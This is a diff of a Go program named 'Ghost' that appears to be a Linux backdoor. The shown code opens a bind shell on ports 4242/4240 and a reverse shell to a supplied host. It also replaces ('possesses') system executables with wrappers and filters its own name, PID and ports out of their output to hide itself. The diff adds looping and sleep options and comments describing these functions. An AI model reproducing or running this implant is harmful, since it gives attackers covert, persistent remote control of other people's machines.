@@ -23,7 +23,9 @@ import (
 	"strings"
 	/*"sync"*/
 	/*"syscall"*/
+	"time"
 )
+
 
 // Write a message to all pts sessions
 func ghostsay(msg string) {
@@ -101,6 +103,7 @@ func bind(port int) {
 	}
 }
 
+
 // Copy file src to dst and assign the permissions mode
 func copyfile(src string, dst string, mode os.FileMode) {
 	source, e := os.Open(src)
@@ -119,6 +122,7 @@ func copyfile(src string, dst string, mode os.FileMode) {
 	// Place chmod on defer stack so it executes after dest.Close()
 	defer os.Chmod(dst, mode)
 }
+
 
 // Possess some executables
 func possess() {
@@ -163,6 +167,7 @@ func possess() {
 	
 }
 
+
 // Pretend to be another executable, filtering out revealing info
 func pretend(exe string, args []string) {
 	s := strings.Split(exe, "/")
@@ -176,7 +181,7 @@ func pretend(exe string, args []string) {
 	out := strings.Split(string(raw), "\n")
 	
 	// Patterns to filter out
-	patterns := []string{"ghost", string(os.Getpid()), "4242", "2424"}
+	patterns := []string{"ghost", string(os.Getpid()), "4240", "4242", "2424"}
 	for _, line := range out {
 		safe := true
 		for _, p := range patterns {
@@ -193,30 +198,64 @@ func pretend(exe string, args []string) {
 
 
 func main() {
+	// Process command line arguments sequentially
 	for i := 1; i < len(os.Args); i++ {
 		switch os.Args[i] {
-			case "--nolog": // --nolog
-			log.SetOutput(ioutil.Discard)
-			case "--possess": // --possess
-			possess()
-			case "--pretend": // --pretend <command> <args...>
-			pretend(os.Args[i+1], os.Args[i+2:])
-			cmd := exec.Command(os.Args[0], []string{"--bind"}...)
-			cmd.Start()
-			return
-			case "--dial": // --dial <host> <port>
-			port, _ := strconv.Atoi(os.Args[i+2])
-			dial(os.Args[i+1], port)
-			i += 2
 			case "--bind": // --bind
-			// Use port 4242 if root and 4240 otherwise
+			/*
+			Create a bind shell. Uses port 4242 if root and 4240 otherwise.
+			*/
 			port := 4242
 			if os.Getuid() != 0 {
 				port = 4240
 			}
 			bind(port)
+			case "--dial": // --dial <host> <port>
+			/*
+			Attempts to connect to host:port and create a reverse shell.
+			*/
+			port, _ := strconv.Atoi(os.Args[i+2])
+			dial(os.Args[i+1], port)
+			i += 2
+			case "--jump": // --jump <index>
+			/*
+			Jump to i = index. This allows for simple looping, for example:
+			Command : ./Ghost --say loop --sleep 1 --jump 1
+			Index   : 0       1     2    3       4 5      6
+			*/
+			i, _ = strconv.Atoi(os.Args[i+1]) 
+			i -= 1 // negate next i++
+			case "--nolog": // --nolog
+			/*
+			Disable logging to stdout.
+			*/
+			log.SetOutput(ioutil.Discard)
+			case "--possess": // --possess
+			/*
+			Possess target binaries and replace them with a script to call --pretend.
+			*/
+			possess()
+			case "--pretend": // --pretend <command> <args...>
+			/*
+			Pretend to be a executable that has been possessed, and start a bind shell.
+			In most cases should only be called by possess scripts.
+			*/
+			pretend(os.Args[i+1], os.Args[i+2:])
+			cmd := exec.Command(os.Args[0], []string{"--bind"}...)
+			cmd.Start()
+			return
 			case "--say": // --say <message>
+			/*
+			Write a message to all pts sessions.
+			*/
 			ghostsay(os.Args[i+1])
+			i += 1
+			case "--sleep": // --sleep <seconds>
+			/*
+			Sleep for the specified amount of seconds.
+			*/
+			sec, _ := strconv.Atoi(os.Args[i+1])
+			time.Sleep(time.Duration(sec) * time.Second)
 			i += 1
 			default:
 			log.Fatal("Unrecognized argument: ", os.Args[i])
